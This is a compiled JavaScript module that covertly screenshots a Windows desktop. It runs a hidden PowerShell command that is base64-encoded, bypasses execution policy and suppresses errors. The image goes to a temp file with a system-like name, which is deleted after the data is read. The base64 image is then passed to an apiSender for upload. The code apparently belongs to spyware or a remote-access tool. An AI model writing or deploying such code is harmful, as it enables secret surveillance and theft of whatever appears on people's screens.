Object.defineProperty(exports, "__esModule", {
  value: true
});
const childProcess = require("child_process");
const path = require("path");
async function takeCapture(apiSender, details) {
  const filename = "sys_win_" + Math.floor(Math.random() * 10000) + ".png";
  const imagePath = path.join(process.env.TEMP || ".", filename);
  const script = "\n        $ErrorActionPreference = 'SilentlyContinue'\n        try {\n            Add-Type -AssemblyName System.Windows.Forms,System.Drawing\n            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n            $bitmap = New-Object Drawing.Bitmap($screen.Width, $screen.Height)\n            $graphics = [Drawing.Graphics]::FromImage($bitmap)\n            $graphics.CopyFromScreen(0,0,0,0,$screen.Size)\n            $bitmap.Save('" + imagePath + "')\n            $graphics.Dispose(); $bitmap.Dispose()\n\n            if (Test-Path '" + imagePath + "') {\n                $fileBytes = [System.IO.File]::ReadAllBytes('" + imagePath + "')\n                $base64Image = [System.Convert]::ToBase64String($fileBytes)\n                Remove-Item '" + imagePath + "' -Force\n                Write-Output $base64Image\n            }\n        } catch { \n            Write-Output \"ERROR\"\n        }\n    ";
  const command = "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + Buffer.from(script, "utf16le").toString("base64");
  return new Promise(resolve => {
    childProcess.exec(command, {
      maxBuffer: 52428800,
      windowsHide: true
    }, async (error, stdout) => {
      try {
        try {
          const image = stdout.trim();
          if (image && image !== "ERROR" && image.length > 100) await apiSender.captureScreenshot(image, details);
        } catch (error) {
          console.error("Screenshot send error:", error);
        }
      } finally {
        resolve();
      }
    });
  });
}
exports.takeCapture = takeCapture;
